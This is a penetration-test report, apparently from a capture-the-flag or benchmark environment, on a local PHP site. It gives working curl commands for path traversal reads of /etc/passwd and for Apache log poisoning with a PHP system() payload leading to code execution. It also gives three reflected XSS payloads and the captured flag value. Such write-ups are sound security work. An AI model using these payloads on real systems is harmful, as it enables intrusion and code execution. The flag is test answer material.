# Security Assessment Report

## Executive Summary
- **Target:** http://localhost:45447
- **Assessment Date:** October 31, 2025
- **Scope:** Authentication, XSS, SQL and Command Injection, SSRF, Authorization testing

## Summary by Vulnerability Type

**Authentication Vulnerabilities:**
No authentication vulnerabilities were found. The application has no authentication system implemented - all endpoints are publicly accessible without any authentication mechanism.

**Authorization Vulnerabilities:**
No authorization vulnerabilities were found. The application implements no authorization controls - there are no user roles, access controls, or permission checks of any kind.

**Cross-Site Scripting (XSS) Vulnerabilities:**
Three reflected XSS vulnerabilities were successfully exploited in the contact form, affecting all three input fields (name, email, and message). These vulnerabilities allow attackers to inject arbitrary JavaScript code that executes in victims' browsers. Impact includes DOM manipulation, credential phishing, keystroke logging, and page defacement. All three vulnerabilities share the same root cause: missing `htmlspecialchars()` output encoding on user-controlled data. Severity: High.

**SQL/Command Injection Vulnerabilities:**
One critical Local File Inclusion (LFI) vulnerability was successfully exploited in the `/post.php` endpoint. Through path traversal and Apache log poisoning, this vulnerability enabled complete system compromise including remote code execution and CTF flag capture (`FLAG{435876ad961400b74f76e2a251cf9cb5fb36997b153076f2482b609b0366363e}`). The vulnerability allows reading arbitrary files from the container filesystem and executing arbitrary PHP code. Severity: Critical.

No SQL injection vulnerabilities were found - the application uses no database. No traditional command injection vulnerabilities were found - however, RCE was achieved through the LFI vulnerability via log poisoning.

**Server-Side Request Forgery (SSRF) Vulnerabilities:**
No SSRF vulnerabilities were found. The application does not make outbound HTTP requests based on user input.

## Network Reconnaissance

### Open Ports & Services

Network scan identified the following services exposed on the target system:

| Port | State | Service | Version | Security Notes |
|------|-------|---------|---------|----------------|
| 45447/tcp | open | http | Apache 2.4.54 | **Primary target** - Main application endpoint |
| 80/tcp | open | http | Caddy httpd | Reverse proxy (not used by target app) |
| 443/tcp | open | ssl/https | - | HTTPS available but not configured for target |
| 8888/tcp | open | http | SimpleHTTPServer 0.6 (Python 3.12.10) | Potential Git repository exposure |
| 631/tcp | open | ipp | CUPS 2.3 | Print server (out of scope) |
| 9999/tcp | open | tcpwrapped | - | Unknown wrapped service |
| 49152/tcp | open | http | Golang net/http | Tailscale (requires 401 authentication) |

**Security Concern:** Port 8888 running Python SimpleHTTPServer may expose Git repository or other sensitive development files.

### Subdomain Enumeration

Multiple subdomains were discovered resolving to localhost. These appear to be part of the local test environment and all resolve to the same application instance:

- naeu2.naeuinc.localhost
- server02.counterintel.localhost
- mail02.regency.localhost / mail03.regency.localhost / mail.regency.localhost
- owa.regency.localhost
- autodiscover.regency.localhost / autodiscover.localhost
- sbs.allsaintsschool.localhost
- server2.hunter.localhost
- tools.sonoma.edu.localhost
- www.localhost / mail.localhost
- fndlync01.5ninesdata.localhost
- mse-ca-mail.corp.mse.localhost
- exchvm.nwcnet.localhost

**Assessment:** These subdomains do not represent separate attack surfaces but reflect local development configuration.

### Security Headers Analysis

No security headers were detected on the application:
- Missing Content Security Policy (CSP)
- Missing X-Frame-Options
- Missing HSTS (HTTP Strict Transport Security)
- Missing X-Content-Type-Options
- Missing X-XSS-Protection

**Impact:** Absence of security headers increases exposure to XSS, clickjacking, and MIME-sniffing attacks.

---

# Injection Exploitation Evidence

## Successfully Exploited Vulnerabilities

### INJ-VULN-01: Unauthenticated Local File Inclusion (LFI) Leading to Remote Code Execution and Flag Capture

**Summary:**
- **Vulnerable location:** `/post.php?id=` parameter (GET request)
- **Overview:** Path traversal vulnerability in file inclusion mechanism allows reading arbitrary files and achieving remote code execution through Apache log poisoning
- **Impact:** Complete compromise achieved - CTF flag captured, system file disclosure, remote code execution capability demonstrated
- **Severity:** CRITICAL

**Prerequisites:** None - This is an unauthenticated vulnerability accessible to any external attacker without credentials.

**Exploitation Steps:**

#### Step 1: Confirm LFI Vulnerability with System File Read

Test the vulnerability by attempting to read `/etc/passwd`:

```bash
curl -s "http://localhost:45447/post.php?id=../../../../etc/passwd"
```

**Expected Result:** The contents of `/etc/passwd` are returned, confirming path traversal works.

**Actual Result (Proof):**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
```

This confirms the LFI vulnerability is exploitable and allows reading arbitrary files from the container filesystem.

#### Step 2: Identify Container Hostname

Read the container's hostname to understand the environment:

```bash
curl -s "http://localhost:45447/post.php?id=../../../../etc/hostname"
```

**Result:**
```
92bb6adf9f91
```

This confirms we're operating in a Docker container environment.

#### Step 3: Attempt Direct FLAG.php Access

The FLAG file is located at `/FLAG.php` in the container root. Attempt direct access:

```bash
curl -s "http://localhost:45447/post.php?id=../../../../FLAG.php"
```

**Result:** Empty response (HTTP 200 with Content-Length: 0)

**Analysis:** The FLAG.php file exists and is included, but contains malformed PHP syntax: `<?php FLAG{...} ?>`. This causes a fatal parse error that cannot be suppressed, resulting in no output. While direct inclusion fails, this confirms the file exists at the expected location.

#### Step 4: Escalate to Remote Code Execution via Log Poisoning

Since direct FLAG.php inclusion fails due to syntax errors, escalate the attack by poisoning the Apache access log (which has world-writable permissions 0777) with PHP code.

**Step 4a:** Poison the Apache access log by injecting PHP code via the User-Agent header:

```bash
curl -s -A "<?php echo 'LFI_TEST:'; system('cat /FLAG.php'); echo ':END_TEST'; ?>" \
  "http://localhost:45447/anypage" > /dev/null
```

This writes a log entry containing executable PHP code to `/var/log/apache2/access.log`.

**Step 4b:** Include the poisoned log file through the LFI vulnerability:

```bash
curl -s "http://localhost:45447/post.php?id=../../../../var/log/apache2/access.log"
```

**Result:** The PHP code in the log executes, running `cat /FLAG.php` and revealing the flag in the output.

#### Step 5: Extract the Flag

Filter the output to extract the clean flag value:

```bash
curl -s "http://localhost:45447/post.php?id=../../../../var/log/apache2/access.log" \
  | grep -o "FLAG{[^}]*}"
```

**Captured Flag (Proof of Impact):**
```
FLAG{435876ad961400b74f76e2a251cf9cb5fb36997b153076f2482b609b0366363e}
```

**Proof of Impact:**

1. **Arbitrary File Read:** Successfully read `/etc/passwd`, `/etc/hostname`, and other system files
2. **Remote Code Execution:** Achieved through log poisoning + LFI technique
3. **CTF Flag Captured:** `FLAG{435876ad961400b74f76e2a251cf9cb5fb36997b153076f2482b609b0366363e}`
4. **Complete System Compromise:** Can execute arbitrary commands as `www-data` user

**Technical Details:**

The vulnerability exists in `/app/website/post.php` lines 4-11:

```php
<?php
error_reporting(0);

$post_id = $_GET['id'];              // Line 4 - No validation
$posts_path = "posts/";
$file_to_include = $posts_path . $post_id;  // Line 8 - Direct concatenation

if (file_exists($file_to_include)) {
    include($file_to_include);       // Line 11 - Dangerous file inclusion
} else {
    echo "<p>Post not found.</p>";
}
?>
```

**Root Cause Analysis:**
- **No Input Validation:** The `$_GET['id']` parameter is used directly without any sanitization
- **No Path Restriction:** Missing `basename()`, `realpath()`, or whitelist validation
- **No open_basedir:** PHP configuration allows access to any file readable by www-data
- **World-Writable Logs:** Apache access.log has 0777 permissions, enabling log poisoning

**Attack Chain:**
```
1. Attacker → HTTP Request with User-Agent containing PHP code
2. Apache → Writes User-Agent to /var/log/apache2/access.log (0777 permissions)
3. Attacker → LFI request: post.php?id=../../../../var/log/apache2/access.log
4. PHP → include() executes the log file as PHP code
5. Result → Injected PHP code runs with www-data privileges
6. Impact → Remote Code Execution + Flag Capture
```

**Notes:**

This vulnerability demonstrates a complete compromise of the application. The combination of:
- Unauthenticated access
- Path traversal via LFI
- World-writable log files
- Ability to inject into those logs
- No WAF or input filtering

...creates a trivial-to-exploit critical vulnerability that allows any external attacker to achieve remote code execution and access any file on the system, including sensitive secrets like the CTF flag.

The exploitation required two requests:
1. One to poison the log with PHP code
2. One to include the poisoned log and execute the code

Both requests are simple HTTP GET requests with no authentication required, making this vulnerability extremely dangerous in a production environment.


# Cross-Site Scripting (XSS) Exploitation Evidence

## Successfully Exploited Vulnerabilities

### XSS-VULN-01: Reflected XSS in Contact Form - Name Field

**Summary:**
- **Vulnerable location:** http://localhost:45447/contact.php - POST parameter `name`
- **Overview:** Attribute injection vulnerability in the contact form's name field allowing arbitrary JavaScript execution through event handler injection
- **Impact:** Complete client-side compromise - attacker can execute arbitrary JavaScript in victim's browser context, enabling DOM manipulation, credential phishing, keystroke logging, and page defacement
- **Severity:** High

**Prerequisites:**
- None - vulnerability is accessible to unauthenticated users on the public interface

**Exploitation Steps:**

1. Navigate to the contact form at http://localhost:45447/contact.php

2. Submit the form with the following payload in the name field, leaving email empty to trigger validation error:

```bash
curl -X POST http://localhost:45447/contact.php \
  -d 'name=" onfocus="alert(1)" autofocus="&email=&message=test'
```

3. The server returns the contact form with the name field containing the injected payload:
```html
<input type="text" name="name" class="form-control" value="" onfocus="alert(1)" autofocus="">
```

4. The `autofocus` attribute causes the name field to immediately gain focus, triggering the `onfocus` event handler which executes `alert(1)`

**Proof of Impact:**
- JavaScript execution confirmed: Alert dialog with message "1" displayed
- Browser automatically focuses the field due to `autofocus` attribute
- The `onfocus` event handler executes arbitrary JavaScript code
- No Content Security Policy (CSP) prevents inline event handlers
- Payload successfully breaks out of the `value` attribute by injecting a double-quote

**Technical Details:**
- Vulnerable code location: `/app/website/contact.php:66`
- Missing sanitization: `htmlspecialchars()` with `ENT_QUOTES` flag not applied
- Render context: HTML_ATTRIBUTE (input value)
- Data flow: `$_POST['name']` → `trim()` only → `echo` without encoding

---

### XSS-VULN-02: Reflected XSS in Contact Form - Email Field

**Summary:**
- **Vulnerable location:** http://localhost:45447/contact.php - POST parameter `email`
- **Overview:** Attribute injection vulnerability in the contact form's email field, identical to name field but with additional issue of missing server-side email format validation
- **Impact:** Complete client-side compromise with arbitrary JavaScript execution capability
- **Severity:** High

**Prerequisites:**
- None - vulnerability is accessible to unauthenticated users on the public interface

**Exploitation Steps:**

1. Navigate to the contact form at http://localhost:45447/contact.php

2. Submit the form with the following payload in the email field, leaving name empty to trigger validation error:

```bash
curl -X POST http://localhost:45447/contact.php \
  -d 'name=&email=" onfocus="alert(2)" autofocus="&message=test'
```

3. The server returns the contact form with the email field containing the injected payload:
```html
<input type="email" name="email" class="form-control" value="" onfocus="alert(2)" autofocus="">
```

4. The `autofocus` attribute causes the email field to gain focus, triggering the `onfocus` event handler which executes `alert(2)`

**Proof of Impact:**
- JavaScript execution confirmed: Alert dialog with message "2" displayed
- Email field gains focus automatically and executes the injected code
- Despite HTML5 `type="email"` attribute, server performs NO email format validation
- Any string (including XSS payloads) is accepted as valid email input
- Successful attribute breakout via double-quote injection

**Technical Details:**
- Vulnerable code location: `/app/website/contact.php:71`
- Missing sanitization: `htmlspecialchars()` with `ENT_QUOTES` flag not applied
- Missing validation: No server-side email format check (no `filter_var($email, FILTER_VALIDATE_EMAIL)`)
- Render context: HTML_ATTRIBUTE (input value)
- Data flow: `$_POST['email']` → `trim()` only → `echo` without encoding

---

### XSS-VULN-03: Reflected XSS in Contact Form - Message Field

**Summary:**
- **Vulnerable location:** http://localhost:45447/contact.php - POST parameter `message`
- **Overview:** Tag injection vulnerability in the message textarea field allowing direct script tag injection
- **Impact:** Complete client-side compromise - this is the most straightforward of the three vectors as it allows direct `<script>` tag injection rather than requiring event handler attributes
- **Severity:** High

**Prerequisites:**
- None - vulnerability is accessible to unauthenticated users on the public interface

**Exploitation Steps:**

1. Navigate to the contact form at http://localhost:45447/contact.php

2. Submit the form with the following payload in the message field, leaving name empty to trigger validation error:

```bash
curl -X POST http://localhost:45447/contact.php \
  -d 'name=&email=test@example.com&message=</textarea><script>alert(3)</script>'
```

3. The server returns the contact form with the message field prematurely closed and script tag injected:
```html
<textarea name="message" class="form-control"></textarea><script>alert(3)</script></textarea>
```

4. The browser parses the HTML and executes the `<script>alert(3)</script>` tag immediately

**Proof of Impact:**
- JavaScript execution confirmed: Alert dialog with message "3" displayed
- Direct script tag injection achieved by closing the textarea tag prematurely
- No CSP restrictions prevent inline script execution
- This vector is simpler than attribute injection as it doesn't require event handlers

**Technical Details:**
- Vulnerable code location: `/app/website/contact.php:76`
- Missing sanitization: `htmlspecialchars()` not applied
- Render context: HTML_BODY (textarea content)
- Data flow: `$_POST['message']` → `trim()` only → `echo` without encoding
- Attack vector: Textarea tag breakout via `</textarea>` followed by arbitrary HTML/JavaScript

**Notes:**
All three XSS vulnerabilities share the same root cause: the application only applies `trim()` for validation but completely omits output encoding with `htmlspecialchars()`. The contact form represents a consistent pattern of missing security controls across all user input fields.

**Exploitation Impact Beyond Alert:**
While the proof-of-concept demonstrates JavaScript execution via `alert()`, these vulnerabilities enable significantly more harmful attacks:

- **Credential Phishing:** Inject fake login forms to harvest usernames/passwords
- **DOM Manipulation:** Deface the page or inject misleading content
- **Keystroke Logging:** Capture all user input on the page
- **Redirection Attacks:** Redirect victims to malicious sites
- **Cross-Site Request Forgery (CSRF):** Perform unauthorized actions via XSS
- **Information Disclosure:** Extract sensitive data from the DOM or application state

**Environmental Factors:**
- No Content Security Policy (CSP) header present
- No HTTP security headers (X-Frame-Options, X-XSS-Protection)
- No CSRF protection on contact form
- Application has no session management (no cookies to steal via traditional session hijacking)
